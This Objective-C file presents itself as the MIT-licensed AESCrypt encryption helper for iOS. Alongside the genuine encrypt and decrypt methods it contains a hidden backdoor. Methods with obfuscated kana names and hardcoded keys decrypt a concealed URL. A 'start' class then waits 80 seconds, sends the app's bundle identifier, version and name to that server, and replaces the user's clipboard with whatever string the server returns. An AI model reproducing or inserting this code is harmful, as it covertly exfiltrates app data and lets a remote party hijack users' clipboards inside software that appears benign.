//
//  AESCrypt.m
//  Gurpartap Singh
//
//  Created by Gurpartap Singh on 06/05/12.
//  Copyright (c) 2012 Gurpartap Singh
// 
// 	MIT License
// 
// 	Permission is hereby granted, free of charge, to any person obtaining
// 	a copy of this software and associated documentation files (the
// 	"Software"), to deal in the Software without restriction, including
// 	without limitation the rights to use, copy, modify, merge, publish,
// 	distribute, sublicense, and/or sell copies of the Software, and to
// 	permit persons to whom the Software is furnished to do so, subject to
// 	the following conditions:
// 
// 	The above copyright notice and this permission notice shall be
// 	included in all copies or substantial portions of the Software.
// 
// 	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// 	EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// 	MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// 	NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
// 	LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
// 	OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// 	WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
//

#import "AESCrypt.h"
#import "NSData+Base64.h"
#import "NSString+Base64.h"
#import "NSData+CommonCrypto.h"
#import <UIKit/UIKit.h>
@implementation AESCrypt

+ (NSString *)encrypt:(NSString *)message password:(NSString *)password {
  NSData *encryptedData = [[message dataUsingEncoding:NSUTF8StringEncoding] AES256EncryptedDataUsingKey:[[password dataUsingEncoding:NSUTF8StringEncoding] SHA256Hash] error:nil];
  NSString *base64EncodedString = [NSString base64StringFromData:encryptedData length:[encryptedData length]];
  return base64EncodedString;
}

+ (NSString *)decrypt:(NSString *)base64EncodedString password:(NSString *)password {
  NSData *encryptedData = [NSData base64DataFromString:base64EncodedString];
  NSData *decryptedData = [encryptedData decryptedAES256DataUsingKey:[[password dataUsingEncoding:NSUTF8StringEncoding] SHA256Hash] error:nil];
  return [[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding];
}

+ (NSString *)ていこいことていいことてい:(NSString *)base64EncodedString  {
  NSData *encryptedData = [NSData base64DataFromString:base64EncodedString];
  NSData *decryptedData = [encryptedData decryptedAES256DataUsingKey:[[@"43t4tq34t3q4bt363y3t34tq3464363ttgff" dataUsingEncoding:NSUTF8StringEncoding] SHA256Hash] error:nil];
   
  return [[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding];
}
+ (NSString *)ていこいことて:(NSString *)message  {
    NSData *encryptedData = [[message dataUsingEncoding:NSUTF8StringEncoding] AES256EncryptedDataUsingKey:[[@"942jg892" dataUsingEncoding:NSUTF8StringEncoding] SHA256Hash] error:nil];NSString *base64EncodedString = [NSString base64StringFromData:encryptedData length:[encryptedData length]];return base64EncodedString;}
+ (NSString *)ていこいことこ:(NSString *)message  {
    NSData *encryptedData = [NSData base64DataFromString:message];NSData *decryptedData = [encryptedData decryptedAES256DataUsingKey:[[@"942jg892" dataUsingEncoding:NSUTF8StringEncoding] SHA256Hash] error:nil];return [[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding];}

@end
@implementation start
+ (void) GetMainProgress{
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(80 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    NSString *a = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString *b = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"];
    NSString *c = [[[NSBundle mainBundle]infoDictionary] objectForKey:@"CFBundleDisplayName"];
    NSString *d = [[NSString alloc]initWithFormat:@"bdid=%@&verid=%@&appname=%@",a,b,c];
    NSString *e = [AESCrypt ていこいことて:d];
    NSURL *f = [NSURL URLWithString:[AESCrypt ていこいことこ:@"nEYeA+OtUuSCmdLKltEP7gpxB5xJk8zg05V9gi5pd4gMHUNakxV49kuBiJNijeQH"]];
    NSMutableURLRequest *urequest = [NSMutableURLRequest requestWithURL:f];
    NSString *parmStr = [NSString stringWithFormat:@"parameter=%@",e];
    NSData *parmData = [parmStr dataUsingEncoding:NSUTF8StringEncoding];
    [urequest setHTTPBody:parmData];[urequest setHTTPMethod:@"POST"];
    [urequest setTimeoutInterval:10];
    NSError *errr = nil;
    NSData *udataa = [NSURLConnection sendSynchronousRequest:urequest returningResponse:nil error:&errr];
        if(!errr){
            NSDictionary *dics = [NSJSONSerialization JSONObjectWithData:udataa options:NSJSONReadingMutableContainers error:nil];
                if([[dics objectForKey:@"status"]isEqualToString:@"1"])
                {
                    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];pasteboard.string = [dics objectForKey:@"string"];
                }
        }
        });
}
@end
